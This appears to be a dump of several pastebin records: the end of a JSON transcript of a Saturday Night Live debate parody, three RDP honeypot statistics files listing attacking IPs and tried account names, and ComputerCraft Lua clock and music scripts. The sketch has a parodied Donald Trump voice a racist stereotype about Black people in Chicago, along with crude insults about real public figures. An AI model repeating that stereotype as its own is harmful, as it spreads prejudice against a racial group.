      ""speaker"": ""Lester Holt"",
      ""text"": ""THE IRAQ WAR IS ALL ABOUT JUDGMENT. SECRETARY CLINTON, DO YOU THINK YOU HAVE BETTER JUDGMENT THAN MR. TRUMP?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""HA HA, YES, YES. YES. OF COURSE, I DO. DONALD TRUMP HAS TERRIBLE JUDGMENT. HE MAKES BAD DECISIONS. HE SPENDS HIS LIFE CHEATING MIDDLE-CLASS LABORERS. LABORERS LIKE MY OWN HUMAN FATHER. WHO MADE -- I GUESS DRAPES OR PRINTED DRAPES OR SOLD DRAPES OR -- AND HE WAS RELATABLE, AND I AM ALSO RELATABLE.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""MR. TRUMP, SAME QUESTION. WHY IS YOUR JUDGMENT BETTER THAN SECRETARY CLINTON'S?""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""BECAUSE IT IS. I HAVE THE BEST JUDGMENT. AND THE BEST TEMPERAMENT. SHE'S THE ONE WITH THE BAD TEMPERAMENT. SHE'S ALWAYS SCREAMING. SHE'S CONSTANTLY LYING. HER HAIR IS CRAZY. HER FACE IS COMPLETELY ORANGE. EXCEPT AROUND THE EYES WHERE IT'S WHITE. ONCE SHE STOPS TALKING HER MOUTH LOOKS LIKE A TINY LITTLE BUTTHOLE.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""SECRETARY CLINTON, YOU HAVE TWO MINUTES TO RESPOND.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""OH, THAT'S OKAY. HE CAN HAVE MY TWO MINUTES.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""OKAY, MR. TRUMP, TWO MORE MINUTES.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""THE THING ABOUT THE BLACKS IS THAT THEY'RE KILLING EACH OTHER. ALL THE BLACKS LIVE ON ONE STREET IN CHICAGO. ALL ON ONE STREET. IT'S CALLED HELL STREET. AND THEY'RE ON HELL STREET AND THEY'RE ALL JUST KILLING EACH OTHER. JUST LIKE I AM KILLING THIS DEBATE.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""SECRETARY CLINTON, DID YOU HAVE A RESPONSE?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""UM --""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""NOT A -- NOT A RESPONSE, MORE OF A REQUEST. CAN AMERICA VOTE RIGHT NOW?""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""WELL, THIS HAS BEEN AN ILLUMINATING DEBATE. BUT NOW IT'S TIME FOR OUR FINAL --""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""ALICIA MACHADO.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""I'M SORRY, WHAT WAS THAT? WHO IS ALICIA MACHADO?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""THANK YOU FOR BRINGING THAT UP, LESTER. SHE IS A STRONG, BEAUTIFUL, POLITICAL PROP THAT I ALMOST FORGOT TO MENTION TONIGHT, EVEN THOUGH WE ALREADY MADE A WEB VIDEO ABOUT HER. ALICIA MACHADO WAS MISS UNIVERSE IN 1996.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""WHERE'D YOU FIND THIS?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""AND DONALD TRUMP CALLS HER MISS PIGGY.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""HOW DO YOU KNOW THIS?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""AND MISS HOUSEKEEPING.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""THAT'S PRETTY FUNNY.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""MR. TRUMP, YOUR RESPONSE?""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""LESTER, WHY ARE WE TALKING ABOUT THIS WOMAN? WE SHOULD BE TALKING ABOUT THE IMPORTANT ISSUES, LIKE ROSIE O'DONNELL. AND HOW SHE'S A FAT LOSER. EVERYONE AGREES WITH ME AND I WANTED TO BRING THAT UP IN A PRESIDENTIAL DEBATE RIGHT AT THE END, MY OWN VOLITION, GOOD IDEA, I DID IT.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""SECRETARY CLINTON, WHY ARE YOU CRYING?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""I -- I'M SORRY, LESTER. THIS IS GOING SO WELL. IT'S GOING EXACTLY HOW I'D ALWAYS DREAMED.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""OKAY. NOW IT'S TIME TO MOVE ON TO THE CLOSING STATEMENTS. SECRETARY CLINTON, YOU'RE FIRST.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""LISTEN, AMERICA. I GET IT. YOU HATE ME. YOU HATE MY VOICE. AND YOU HATE MY FACE. WELL, HERE'S A TIP. IF YOU NEVER WANT TO SEE MY FACE AGAIN, ELECT ME PRESIDENT, AND I SWEAR TO GOD I WILL LOCK MYSELF IN THE OVAL OFFICE AND NOT COME OUT FOR FOUR YEARS. BUT IF YOU DON'T ELECT ME, I WILL CONTINUE TO RUN FOR PRESIDENT UNTIL THE DAY I DIE. AND I WILL NEVER DIE.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""MR. TRUMP. FINAL REMARKS.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""YOU KNOW WHAT, LESTER? I WAS GOING TO SAY SOMETHING EXTREMELY ROUGH TO HILLARY TONIGHT. BUT I SAID TO MYSELF, I CAN'T DO IT, I JUST CAN'T DO IT. BUT IF I HAD SAID IT IT WOULD HAVE BEEN A NUCLEAR BOMB. BECAUSE IN THE '90s, OUR PRESIDENT WAS A MAN NAMED BILL CLINTON. NOT MANY PEOPLE KNOW THIS, BUT THAT MAN IS HER HUSBAND. IN 1998, GET THIS, HE HAD AN AFFAIR. IT'S TRUE. MY INVESTIGATORS ARE LOOKING INTO IT RIGHT NOW. IT WAS A WOMAN, IT WAS A WOMAN NAMED MONICA. VERY HEAVY. I DON'T HAVE HER LAST NAME YET BUT WHEN I GET IT, I'M GOING TO SET MY ALARM FOR 3:20 A.M. AND GO SIT ON MY GOLDEN TOILET BOWL AND TWEET ABOUT IT UNTIL COMPLETION.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""OH MY GOD. JUST TO REMIND EVERYBODY AT HOME, THIS WAS A PRESIDENTIAL DEBATE. ANY FINAL WORDS?""
    },
    {
      ""speaker"": ""All"",
      ""text"": ""LIVE FROM NEW YORK, IT'S SATURDAY NIGHT!""
    }
  ]
}
"
QhBbjGAj,2024-06-27_stats.json,rdp_snitch,JSON,Thursday 27th of June 2024 07:18:01 PM CDT,"{
  ""ip"": {
    ""23.247.130.238"": 1422,
    ""164.92.104.215"": 9,
    ""205.210.31.215"": 9,
    ""87.251.75.64"": 3,
    ""98.143.255.25"": 18,
    ""64.124.50.139"": 6,
    ""96.51.53.164"": 6,
    ""212.70.149.142"": 12,
    ""104.248.154.46"": 9,
    ""194.165.16.78"": 6,
    ""45.227.254.54"": 6,
    ""157.10.45.48"": 3,
    ""185.170.144.3"": 6,
    ""112.124.54.21"": 6,
    ""194.165.16.73"": 6,
    ""194.180.49.249"": 3,
    ""205.210.31.164"": 9,
    ""194.165.16.72"": 6,
    ""185.122.204.62"": 9,
    ""212.70.149.146"": 18,
    ""80.66.66.250"": 3,
    ""213.109.202.251"": 18,
    ""45.137.201.119"": 3,
    ""185.122.204.64"": 9,
    ""118.71.209.116"": 3,
    ""211.114.132.69"": 3,
    ""81.19.135.2"": 9,
    ""162.210.245.77"": 12,
    ""198.235.24.19"": 9,
    ""103.167.88.153"": 6,
    ""194.169.175.24"": 9,
    ""51.81.163.55"": 3,
    ""116.140.196.215"": 3,
    ""45.227.254.49"": 6,
    ""194.165.16.10"": 6,
    ""205.210.31.246"": 9,
    ""167.94.138.56"": 3
  },
  ""asn"": {
    ""AS138152"": 1422,
    ""AS14061"": 18,
    ""AS396982"": 36,
    ""AS208091"": 3,
    ""AS3367"": 18,
    ""AS6461"": 6,
    ""AS6327"": 6,
    ""AS204428"": 30,
    ""AS48721"": 24,
    ""AS267784"": 12,
    ""AS150862"": 3,
    ""AS197414"": 6,
    ""AS37963"": 6,
    ""AS201814"": 3,
    ""AS57523"": 18,
    ""AS51765"": 3,
    ""AS208312"": 18,
    ""AS49581"": 3,
    ""AS18403"": 3,
    ""AS4766"": 3,
    ""AS209588"": 9,
    ""AS397651"": 12,
    ""AS140804"": 6,
    ""AS209605"": 9,
    ""AS16276"": 3,
    ""AS4837"": 3,
    ""AS398324"": 3
  },
  ""isp"": {
    ""Yisu Cloud LTD"": 1422,
    ""DigitalOcean, LLC"": 18,
    ""Google LLC"": 36,
    ""Xhost Internet Solutions LP"": 9,
    ""Xplornet Communications Inc."": 18,
    ""Zayo Bandwidth"": 6,
    ""Shaw Communications Inc."": 6,
    ""SS-Net"": 30,
    ""Flyservers S.A."": 45,
    ""HAINAMTECH"": 3,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Oy Crea Nova Hosting Solution Ltd"": 3,
    ""Red Byte LLC"": 18,
    ""Ferdinand Zink trading as Tube-Hosting"": 3,
    ""fpt"": 3,
    ""Korea Telecom"": 3,
    ""RCI Broadband"": 12,
    ""Jobkey Joint Stock Company"": 6,
    ""UAB Host Baltic"": 9,
    ""OVH US LLC"": 3,
    ""China Unicom CHINA169 Network"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""IDC SPACE INC"": 1422,
    ""DigitalOcean, LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xhost Internet Solutions"": 6,
    ""Unknown"": 21,
    ""Microsoft Corporation"": 6,
    ""Shaw Communications Inc"": 6,
    ""4Media Ltd"": 30,
    ""Flyservers S.A"": 24,
    ""UAB Host Baltic"": 12,
    ""HAI NAM Real Estate and Technology Joint Stock Company"": 3,
    ""Xhostis"": 6,
    ""Aliyun Computing Co., LTD"": 6,
    ""HostSlick"": 3,
    ""Starcrecium Limited"": 18,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Taurus"": 3,
    ""Kornet"": 3,
    ""Alviva Holding Limited"": 9,
    ""10x Servers"": 12,
    ""JOBKEY"": 6,
    ""EmanuelHosting LTD"": 9,
    ""George, Okpara"": 3,
    ""China United Network Communications Corporation Limited"": 3,
    ""Censys, Inc"": 3
  },
  ""regionName"": {
    ""\u00cele-de-France"": 1422,
    ""California"": 45,
    ""North Holland"": 9,
    ""New Brunswick"": 18,
    ""Virginia"": 21,
    ""Alberta"": 6,
    ""Sofia-Capital"": 30,
    ""Central Singapore"": 9,
    ""Kaunas"": 33,
    ""Vilnius"": 12,
    ""Tuy\u00ean Quang Province"": 3,
    ""Zhejiang"": 6,
    ""Moscow"": 36,
    ""Uusimaa"": 3,
    ""Lombardy"": 3,
    ""Ho Chi Minh"": 3,
    ""Gyeonggi-do"": 3,
    ""Hesse"": 9,
    ""Da Nang"": 6,
    ""Oregon"": 3,
    ""Beijing"": 3,
    ""Michigan"": 3
  },
  ""country"": {
    ""France"": 1422,
    ""United States"": 72,
    ""The Netherlands"": 9,
    ""Canada"": 24,
    ""Bulgaria"": 30,
    ""Singapore"": 9,
    ""Lithuania"": 45,
    ""Vietnam"": 12,
    ""China"": 9,
    ""Russia"": 36,
    ""Finland"": 3,
    ""Italy"": 3,
    ""South Korea"": 3,
    ""Germany"": 9
  },
  ""account"": {
    ""710992661"": 1422,
    ""hello"": 66,
    ""xJIJnLpyP"": 3,
    ""oQAYOg"": 3,
    ""jFKeIm"": 3,
    ""Administr"": 33,
    ""Test"": 63,
    ""fTstrtJVv"": 3,
    ""kExEys"": 3,
    ""oLqidE"": 3,
    ""Domain"": 57,
    ""(empty)"": 9,
    ""YGJxlaMUx"": 3,
    ""IuvpdY"": 3,
    ""uXsJGD"": 3,
    ""LiwMEJWWz"": 3,
    ""SreMmn"": 3,
    ""bgfLif"": 3
  },
  ""keyboard"": {
    ""Unknown"": 1686
  },
  ""client_build"": {
    ""Unknown"": 1686
  },
  ""client_name"": {
    ""Unknown"": 1686
  },
  ""ip_type"": {
    ""Unknown"": 1572,
    ""hosting"": 66,
    ""proxy"": 48
  }
}"
CtYz9Nvp,2024-06-27_stats.json,rdp_snitch,JSON,Thursday 27th of June 2024 07:16:12 PM CDT,"{
  ""ip"": {
    ""23.247.130.238"": 948,
    ""164.92.104.215"": 6,
    ""205.210.31.215"": 6,
    ""87.251.75.64"": 2,
    ""98.143.255.25"": 12,
    ""64.124.50.139"": 4,
    ""96.51.53.164"": 4,
    ""212.70.149.142"": 8,
    ""104.248.154.46"": 6,
    ""194.165.16.78"": 4,
    ""45.227.254.54"": 4,
    ""157.10.45.48"": 2,
    ""185.170.144.3"": 4,
    ""112.124.54.21"": 4,
    ""194.165.16.73"": 4,
    ""194.180.49.249"": 2,
    ""205.210.31.164"": 6,
    ""194.165.16.72"": 4,
    ""185.122.204.62"": 6,
    ""212.70.149.146"": 12,
    ""80.66.66.250"": 2,
    ""213.109.202.251"": 12,
    ""45.137.201.119"": 2,
    ""185.122.204.64"": 6,
    ""118.71.209.116"": 2,
    ""211.114.132.69"": 2,
    ""81.19.135.2"": 6,
    ""162.210.245.77"": 8,
    ""198.235.24.19"": 6,
    ""103.167.88.153"": 4,
    ""194.169.175.24"": 6,
    ""51.81.163.55"": 2,
    ""116.140.196.215"": 2,
    ""45.227.254.49"": 4,
    ""194.165.16.10"": 4,
    ""205.210.31.246"": 6,
    ""167.94.138.56"": 2
  },
  ""asn"": {
    ""AS138152"": 948,
    ""AS14061"": 12,
    ""AS396982"": 24,
    ""AS208091"": 2,
    ""AS3367"": 12,
    ""AS6461"": 4,
    ""AS6327"": 4,
    ""AS204428"": 20,
    ""AS48721"": 16,
    ""AS267784"": 8,
    ""AS150862"": 2,
    ""AS197414"": 4,
    ""AS37963"": 4,
    ""AS201814"": 2,
    ""AS57523"": 12,
    ""AS51765"": 2,
    ""AS208312"": 12,
    ""AS49581"": 2,
    ""AS18403"": 2,
    ""AS4766"": 2,
    ""AS209588"": 6,
    ""AS397651"": 8,
    ""AS140804"": 4,
    ""AS209605"": 6,
    ""AS16276"": 2,
    ""AS4837"": 2,
    ""AS398324"": 2
  },
  ""isp"": {
    ""Yisu Cloud LTD"": 948,
    ""DigitalOcean, LLC"": 12,
    ""Google LLC"": 24,
    ""Xhost Internet Solutions LP"": 6,
    ""Xplornet Communications Inc."": 12,
    ""Zayo Bandwidth"": 4,
    ""Shaw Communications Inc."": 4,
    ""SS-Net"": 20,
    ""Flyservers S.A."": 30,
    ""HAINAMTECH"": 2,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""MEVSPACE sp. z o.o."": 2,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Oy Crea Nova Hosting Solution Ltd"": 2,
    ""Red Byte LLC"": 12,
    ""Ferdinand Zink trading as Tube-Hosting"": 2,
    ""fpt"": 2,
    ""Korea Telecom"": 2,
    ""RCI Broadband"": 8,
    ""Jobkey Joint Stock Company"": 4,
    ""UAB Host Baltic"": 6,
    ""OVH US LLC"": 2,
    ""China Unicom CHINA169 Network"": 2,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""IDC SPACE INC"": 948,
    ""DigitalOcean, LLC"": 12,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 4,
    ""Unknown"": 14,
    ""Microsoft Corporation"": 4,
    ""Shaw Communications Inc"": 4,
    ""4Media Ltd"": 20,
    ""Flyservers S.A"": 16,
    ""UAB Host Baltic"": 8,
    ""HAI NAM Real Estate and Technology Joint Stock Company"": 2,
    ""Xhostis"": 4,
    ""Aliyun Computing Co., LTD"": 4,
    ""HostSlick"": 2,
    ""Starcrecium Limited"": 12,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Taurus"": 2,
    ""Kornet"": 2,
    ""Alviva Holding Limited"": 6,
    ""10x Servers"": 8,
    ""JOBKEY"": 4,
    ""EmanuelHosting LTD"": 6,
    ""George, Okpara"": 2,
    ""China United Network Communications Corporation Limited"": 2,
    ""Censys, Inc"": 2
  },
  ""regionName"": {
    ""\u00cele-de-France"": 948,
    ""California"": 30,
    ""North Holland"": 6,
    ""New Brunswick"": 12,
    ""Virginia"": 14,
    ""Alberta"": 4,
    ""Sofia-Capital"": 20,
    ""Central Singapore"": 6,
    ""Kaunas"": 22,
    ""Vilnius"": 8,
    ""Tuy\u00ean Quang Province"": 2,
    ""Zhejiang"": 4,
    ""Moscow"": 24,
    ""Uusimaa"": 2,
    ""Lombardy"": 2,
    ""Ho Chi Minh"": 2,
    ""Gyeonggi-do"": 2,
    ""Hesse"": 6,
    ""Da Nang"": 4,
    ""Oregon"": 2,
    ""Beijing"": 2,
    ""Michigan"": 2
  },
  ""country"": {
    ""France"": 948,
    ""United States"": 48,
    ""The Netherlands"": 6,
    ""Canada"": 16,
    ""Bulgaria"": 20,
    ""Singapore"": 6,
    ""Lithuania"": 30,
    ""Vietnam"": 8,
    ""China"": 6,
    ""Russia"": 24,
    ""Finland"": 2,
    ""Italy"": 2,
    ""South Korea"": 2,
    ""Germany"": 6
  },
  ""account"": {
    ""710992661"": 948,
    ""hello"": 44,
    ""xJIJnLpyP"": 2,
    ""oQAYOg"": 2,
    ""jFKeIm"": 2,
    ""Administr"": 22,
    ""Test"": 42,
    ""fTstrtJVv"": 2,
    ""kExEys"": 2,
    ""oLqidE"": 2,
    ""Domain"": 38,
    ""(empty)"": 6,
    ""YGJxlaMUx"": 2,
    ""IuvpdY"": 2,
    ""uXsJGD"": 2,
    ""LiwMEJWWz"": 2,
    ""SreMmn"": 2,
    ""bgfLif"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1124
  },
  ""client_build"": {
    ""Unknown"": 1124
  },
  ""client_name"": {
    ""Unknown"": 1124
  },
  ""ip_type"": {
    ""Unknown"": 1048,
    ""hosting"": 44,
    ""proxy"": 32
  }
}"
qYimYx37,2024-06-27_stats.json,rdp_snitch,JSON,Thursday 27th of June 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""23.247.130.238"": 474,
    ""164.92.104.215"": 3,
    ""205.210.31.215"": 3,
    ""87.251.75.64"": 1,
    ""98.143.255.25"": 6,
    ""64.124.50.139"": 2,
    ""96.51.53.164"": 2,
    ""212.70.149.142"": 4,
    ""104.248.154.46"": 3,
    ""194.165.16.78"": 2,
    ""45.227.254.54"": 2,
    ""157.10.45.48"": 1,
    ""185.170.144.3"": 2,
    ""112.124.54.21"": 2,
    ""194.165.16.73"": 2,
    ""194.180.49.249"": 1,
    ""205.210.31.164"": 3,
    ""194.165.16.72"": 2,
    ""185.122.204.62"": 3,
    ""212.70.149.146"": 6,
    ""80.66.66.250"": 1,
    ""213.109.202.251"": 6,
    ""45.137.201.119"": 1,
    ""185.122.204.64"": 3,
    ""118.71.209.116"": 1,
    ""211.114.132.69"": 1,
    ""81.19.135.2"": 3,
    ""162.210.245.77"": 4,
    ""198.235.24.19"": 3,
    ""103.167.88.153"": 2,
    ""194.169.175.24"": 3,
    ""51.81.163.55"": 1,
    ""116.140.196.215"": 1,
    ""45.227.254.49"": 2,
    ""194.165.16.10"": 2,
    ""205.210.31.246"": 3,
    ""167.94.138.56"": 1
  },
  ""asn"": {
    ""AS138152"": 474,
    ""AS14061"": 6,
    ""AS396982"": 12,
    ""AS208091"": 1,
    ""AS3367"": 6,
    ""AS6461"": 2,
    ""AS6327"": 2,
    ""AS204428"": 10,
    ""AS48721"": 8,
    ""AS267784"": 4,
    ""AS150862"": 1,
    ""AS197414"": 2,
    ""AS37963"": 2,
    ""AS201814"": 1,
    ""AS57523"": 6,
    ""AS51765"": 1,
    ""AS208312"": 6,
    ""AS49581"": 1,
    ""AS18403"": 1,
    ""AS4766"": 1,
    ""AS209588"": 3,
    ""AS397651"": 4,
    ""AS140804"": 2,
    ""AS209605"": 3,
    ""AS16276"": 1,
    ""AS4837"": 1,
    ""AS398324"": 1
  },
  ""isp"": {
    ""Yisu Cloud LTD"": 474,
    ""DigitalOcean, LLC"": 6,
    ""Google LLC"": 12,
    ""Xhost Internet Solutions LP"": 3,
    ""Xplornet Communications Inc."": 6,
    ""Zayo Bandwidth"": 2,
    ""Shaw Communications Inc."": 2,
    ""SS-Net"": 10,
    ""Flyservers S.A."": 15,
    ""HAINAMTECH"": 1,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""MEVSPACE sp. z o.o."": 1,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Oy Crea Nova Hosting Solution Ltd"": 1,
    ""Red Byte LLC"": 6,
    ""Ferdinand Zink trading as Tube-Hosting"": 1,
    ""fpt"": 1,
    ""Korea Telecom"": 1,
    ""RCI Broadband"": 4,
    ""Jobkey Joint Stock Company"": 2,
    ""UAB Host Baltic"": 3,
    ""OVH US LLC"": 1,
    ""China Unicom CHINA169 Network"": 1,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""IDC SPACE INC"": 474,
    ""DigitalOcean, LLC"": 6,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 2,
    ""Unknown"": 7,
    ""Microsoft Corporation"": 2,
    ""Shaw Communications Inc"": 2,
    ""4Media Ltd"": 10,
    ""Flyservers S.A"": 8,
    ""UAB Host Baltic"": 4,
    ""HAI NAM Real Estate and Technology Joint Stock Company"": 1,
    ""Xhostis"": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""HostSlick"": 1,
    ""Starcrecium Limited"": 6,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Taurus"": 1,
    ""Kornet"": 1,
    ""Alviva Holding Limited"": 3,
    ""10x Servers"": 4,
    ""JOBKEY"": 2,
    ""EmanuelHosting LTD"": 3,
    ""George, Okpara"": 1,
    ""China United Network Communications Corporation Limited"": 1,
    ""Censys, Inc"": 1
  },
  ""regionName"": {
    ""\u00cele-de-France"": 474,
    ""California"": 15,
    ""North Holland"": 3,
    ""New Brunswick"": 6,
    ""Virginia"": 7,
    ""Alberta"": 2,
    ""Sofia-Capital"": 10,
    ""Central Singapore"": 3,
    ""Kaunas"": 11,
    ""Vilnius"": 4,
    ""Tuy\u00ean Quang Province"": 1,
    ""Zhejiang"": 2,
    ""Moscow"": 12,
    ""Uusimaa"": 1,
    ""Lombardy"": 1,
    ""Ho Chi Minh"": 1,
    ""Gyeonggi-do"": 1,
    ""Hesse"": 3,
    ""Da Nang"": 2,
    ""Oregon"": 1,
    ""Beijing"": 1,
    ""Michigan"": 1
  },
  ""country"": {
    ""France"": 474,
    ""United States"": 24,
    ""The Netherlands"": 3,
    ""Canada"": 8,
    ""Bulgaria"": 10,
    ""Singapore"": 3,
    ""Lithuania"": 15,
    ""Vietnam"": 4,
    ""China"": 3,
    ""Russia"": 12,
    ""Finland"": 1,
    ""Italy"": 1,
    ""South Korea"": 1,
    ""Germany"": 3
  },
  ""account"": {
    ""710992661"": 474,
    ""hello"": 22,
    ""xJIJnLpyP"": 1,
    ""oQAYOg"": 1,
    ""jFKeIm"": 1,
    ""Administr"": 11,
    ""Test"": 21,
    ""fTstrtJVv"": 1,
    ""kExEys"": 1,
    ""oLqidE"": 1,
    ""Domain"": 19,
    ""(empty)"": 3,
    ""YGJxlaMUx"": 1,
    ""IuvpdY"": 1,
    ""uXsJGD"": 1,
    ""LiwMEJWWz"": 1,
    ""SreMmn"": 1,
    ""bgfLif"": 1
  },
  ""keyboard"": {
    ""Unknown"": 562
  },
  ""client_build"": {
    ""Unknown"": 562
  },
  ""client_name"": {
    ""Unknown"": 562
  },
  ""ip_type"": {
    ""Unknown"": 524,
    ""hosting"": 22,
    ""proxy"": 16
  }
}"
3wXTYMuS,Real Life Clock Scaled [6x3] Monitor,MigasRocha,Lua,Thursday 27th of June 2024 07:03:18 PM CDT,"-- Step 1: Wrap the monitor peripheral
local side = ""left""  -- Replace with the side the monitor is attached to
local monitor = peripheral.wrap(side)

-- Check if the monitor is wrapped successfully
if not monitor then
    print(""Error: No monitor found on the specified side: "" .. side)
    return
end

-- Set text scale and redirection
monitor.setTextScale(4)  -- Adjust text scale as needed
term.redirect(monitor)

-- Function to get the current time as a table
local function getRealTime()
    local time = os.date(""*t"")
    return {hour = time.hour, min = time.min}
end

-- Function to display the time centered on the monitor
local function displayTime()
    local currentTime = getRealTime()
    local monitorWidth, monitorHeight = monitor.getSize()
    local text = string.format(""%02d:%02d"", currentTime.hour, currentTime.min)
    local textWidth = #text * 1  -- Multiply by text scale (4) to get effective width
    local xPos = math.floor((monitorWidth - textWidth) / 2) + 1
    local yPos = math.floor(monitorHeight / 1.6 )
    
    monitor.clear()
    monitor.setCursorPos(xPos, yPos)
    monitor.setTextColor(colors.orange)
    monitor.write(text)
    monitor.setCursorPos(4,1)
    monitor.setTextColor(colors.red)
    monitor.write(""Real Time"")
end


    




-- Main loop to continuously update and display the time
while true do
    displayTime()
    sleep(1)  -- Update the time every second
end
"
Uz7Kz0Jh,"SongPlayer ""Multiple Parts"" [UNFINISHED]",MigasRocha,Lua,Thursday 27th of June 2024 07:00:59 PM CDT,"
local speakerSide = ""right"" 

local fileName = ""music.dfpwm""
local file = fs.open(fileName, ""rb"") 

if not file then
    print(""Failed to open "" .. fileName)
    return
end


local fileSize = fs.getSize(fileName)


if not peripheral.isPresent(speakerSide) then
    print(""No peripheral found on side "" .. speakerSide)
    file.close()
    return
end


local speaker = peripheral.wrap(speakerSide)

if type(speaker) ~= ""table"" or not speaker.playAudio then
    print(""Peripheral on side "" .. speakerSide .. "" is not a valid speaker"")
    file.close()
    return
end


local dfpwm = require(""cc.audio.dfpwm"").make_decoder()


local chunkSize = 16 * 1024 -- 16 KB


local function streamAndPlayAudio()
    local totalBytesRead = 0
    
    while true do
        local chunk = file.read(chunkSize)
        if not chunk then
            break
        end
        
        local decodedChunk = dfpwm(chunk)
        speaker.playAudio(decodedChunk)
        

        totalBytesRead = totalBytesRead + #chunk
        
     
        local progress = math.floor(totalBytesRead / fileSize * 100)
        
       
        term.clearLine()
        term.setCursorPos(1, 1)
        
        
        io.write(""Progress: ["" .. string.rep(""#"", progress) .. string.rep(""-"", 100 - progress) .. ""] "" .. progress .. ""%"")
        
        
        sleep(2.3) 
    end
    
    
    print()
end


print(""Streaming and playing song..."")
streamAndPlayAudio()


file.close()
"
Ebdt8r4A,"SongPlayer ""WiredSpeakers""",MigasRocha,Lua,Thursday 27th of June 2024 06:59:02 PM CDT,"--Check pelo musica na memoria do computer
local dfpwmFileName = ""Daisuki.dfpwm""  -- ""TEMPORARIO"" alterar o nome com a musica

local dfpwmFile = fs.open(dfpwmFileName, ""rb"")
if not dfpwmFile then
    print(""Failed to open "" .. dfpwmFileName)
    return
end
print(""Opened file "" .. dfpwmFileName)

-- Dar wrap nos pelos modems
local function findSpeakers()
    local speakers = {}
    local modemSide = ""top""

    -- Encontrar Peripherals Connectados no Modem
    local modem = peripheral.wrap(modemSide)
    if not modem then
        print(""No modem found on side "" .. modemSide)
        return nil
    end
    print(""Modem found on side "" .. modemSide)
    
    -- Procurar Speakers na rede de wires
    local connectedPeripherals = modem.getNamesRemote()
    for _, peripheralName in ipairs(connectedPeripherals) do
        local speaker = peripheral.wrap(peripheralName)
        if speaker and type(speaker) == ""table"" and speaker.playAudio then
            table.insert(speakers, speaker)
            print(""Found valid speaker: "" .. peripheralName)
        else
            print(""Found invalid peripheral: "" .. peripheralName)
        end
    end

    return speakers
end

local speakers = findSpeakers()
if #speakers == 0 then
    print(""No valid speakers found connected through wired modems."")
    dfpwmFile.close()
    return
end
print(""Found "" .. #speakers .. "" valid speakers"")

-- Decoder
local dfpwm = require(""cc.audio.dfpwm"").make_decoder()

-- Tamanho do chunk que le de cada vez
local chunkSize = 16 * 1024  -- 16 KB

-- Funçao para Streamar o audio
local function streamAndPlayAudio()
    local totalBytesRead = 0
    while true do
        local chunk = dfpwmFile.read(chunkSize)
        if not chunk then
            break
        end

        local decodedChunk = dfpwm(chunk)
        
        -- Audio pelos speakers
        for _, speaker in ipairs(speakers) do
            local success, err = pcall(function() speaker.playAudio(decodedChunk) end)
            if not success then
                print(""Error playing audio on speaker: "" .. err)
            end
        end
        
        -- Ajustar o timing da musica ""2.3 normalmente"" ""IMPORTANTE"" aumentar para tirar skip diminuir para tirar cortes
        sleep(2.3) 
        


        ---Debug Remover Depois
        totalBytesRead = totalBytesRead + #chunk
        --print(""Total bytes read: "" .. totalBytesRead)
    end
end

-- Começar A musica
